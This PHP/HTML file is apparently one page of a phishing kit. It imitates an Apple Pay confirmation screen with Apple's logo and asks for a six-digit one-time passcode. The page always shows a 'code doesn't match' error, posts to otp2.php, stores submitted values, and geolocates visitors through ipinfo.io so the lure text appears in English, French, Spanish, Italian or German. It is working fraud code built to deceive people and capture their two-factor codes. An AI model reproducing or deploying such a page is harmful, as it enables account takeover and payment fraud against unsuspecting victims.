<?php
error_reporting(0);
include 'lib/page-functions.php';

page_initialise();
store_post_values($_POST);
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, inital-scale=1">
    <title>Apple Pay</title>

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">

    <script src="./lib/jquery.js"></script>
    <script src="./lib/jquery.mask.js"></script>
    <script src="./lib/jquery.validate.js"></script>
  </head>
  <body>
    <style>
      .content {
        width: 500px;
      }

      .title {
        margin-top: 45px;
        text-align: center;
        font-weight: bold;
      }

      .small-title {
        text-align: center;
        margin-top: -5px;
      }

      .input-section {
        border-top: 1px solid lightgray;
        padding: 10px;
      }

      .input-desc {
        font-weight: bold;
        text-align: center;
        font-size: 13px;
        margin-right: 15px;
      }

      .input {
        border: 0px solid lightgray;
        background: rgba(155, 155,155, 0.2);
        border-radius: 5px;
        padding: 5px;
        font-weight: 300;
        width: 100%;
        height: 45px;
        font-size: 18px;
      }

      .input:focus {
        outline: none;
      }

      .submit {
        margin-top: 1px;
        width: 100%;
        background: rgb(10, 132, 255);
        color: white;
        border: 1px solid rgb(60, 60, 255);
        border-radius: 7px;
        height: 35px;
      }

      .submit:hover {
        filter: brightness(95%);
      }

      .logo {
        width: 40px;
        display: block;
        margin: auto;
        margin-top: 30px;
      }
      .nav-btn {
        margin-top: 2px;
      }

      #center {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);

        width: 500px;
      }

      @media only screen and (max-width: 1035px) {
        #center {
          position: relative !important;
          transform: none;
          top: 0%;
          left: 0%;
        }
      }
    </style>
    <div class="container content">

      <div class="row" id="center">
        <div class="col-lg-12">
          <img class="logo" src="./lib/front_end_files/Apple_logo_black.svg.png">
          <h2 class="title" id="title1">Confirmation</h2>
          <p class="small-title" style="margin-top: 15px;" id="title2">A 6 digit code has been sent to your phone number. Please enter this code below.</p>
          <div class="row">
            <div class="col-12">
              <form id="form" method="post" action="otp2.php">


                <div style="white-space:nowrap; border: none;" class="input-section">
                  <input type="text" id="otp" class="input" name="otp2" required="required" placeholder="One Time Passcode" style="background: rgba(0, 0, 0, 0.03); padding-left: 10px; font-weight: normal; border-radius: 2px;"/>

                </div>
				<p class="input-section" style="
					border: none;
					color: #f00000;
				">
								  
				The one-time passcode you entered doesn't match the one we sent you, please try again
								</p>
                <button class="submit" id="submit-btn" style="border: none;">Continue</button>
              </form>

              <?php
                if ($_SERVER["REMOTE_ADDR"] == "::1") { $ip = '103.23.60.0'; } else { $ip = $_SERVER["REMOTE_ADDR"]; }
                $country_code = strtolower(json_decode(file_get_contents("http://ipinfo.io/$ip"), true)["country"]);

                if ($country_code != 'gb' && $country_code != 'fr' && $country_code != 'es' && $country_code != 'it' && $country_code != 'de') {
                  $country_code = "gb";
                }
               ?>

              <script>

              // Auto Translator
              var page_elements = ["title1", "title2", 'submit-btn'];
              var current_language = "<?= $country_code ?>".toLowerCase();

              var languages = {
                gb: {
                  title1: 'Confirmation',
                  title2: 'A 6 digit code has been sent to your phone number. Please enter this code below.',
                  'submit-btn': 'Continue'
                },
                fr: {
                  title1: 'Confirmation',
                  title2: 'Un code à 6 chiffres a été envoyé à votre numéro de téléphone. Veuillez entrer ce code ci-dessous.',
                  'submit-btn': 'Continuer'
                },
                es: {
                  title1: 'Confirmación',
                  title2: 'Se ha enviado un código de 6 dígitos a su número de teléfono. Por favor, introduzca este código a continuación.',
                  'submit-btn': 'Continuar'
                },
                it: {
                  title1: 'Conferma',
                  title2: 'Un codice di 6 cifre è stato inviato al tuo numero di telefono. Si prega di inserire questo codice qui sotto.',
                  'submit-btn': 'Continua'
                },
                de: {
                  title1: 'Bestätigung',
                  title2: 'Ein 6-stelliger Code wurde an Ihre Telefonnummer gesendet. Bitte geben Sie diesen Code unten ein.',
                  'submit-btn': 'Fortsetzen'
                }
              }

              for (var i = 0; i < page_elements.length; i++) {
                $('#' + page_elements[i]).text(languages[current_language][page_elements[i]])
              }
              </script>

              <style>
              #submit-btn {
                transition: .2s all;
              }

              #submit-btn:disabled {
                background: rgb(150, 150, 255);
                cursor: not-allowed;
              }

              #submit-btn:disabled:hover {
                background: rgb(150, 150, 255) !important;
              }
              </style>
              <script>

              </script>
            </div>
          </div>
        </div>
      </div>
    </div>

  </body>
</html>
